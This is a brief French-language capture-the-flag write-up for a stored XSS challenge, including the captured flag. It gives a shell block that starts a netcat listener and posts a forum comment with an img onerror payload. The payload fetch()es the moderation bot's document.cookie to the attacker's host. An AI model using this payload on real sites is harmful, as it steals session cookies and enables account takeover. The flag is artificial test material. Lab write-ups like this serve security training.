# XSS injection 1

flag: `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`

---

httpOnly est desactive
un bot de moderation lit les nouveaux commentaire

On va essayer de poster un payload et de lui faire lire (et cracher ses cookies)
on utilise ine balise `img` + un event handler, et netcat pour communiquer avec le bot

```shell
# listen with netcat
nc_port=9771
nc -l 0.0.0.0 "$nc_port"

# post a comment with a payload
thread_id=bbeo32ucx0a65b8
host='192.168.122.1' # ip a

payload="<img src=z onerror='fetch(&quot;http://$host:$nc_port/?want=&quot;+encodeURIComponent(document.cookie))'>"

curl -s "http://$target/forum/$thread_id/comment' \
  -b cookies_jdoe.txt \
  --data-urlencode "content=$payload"
```
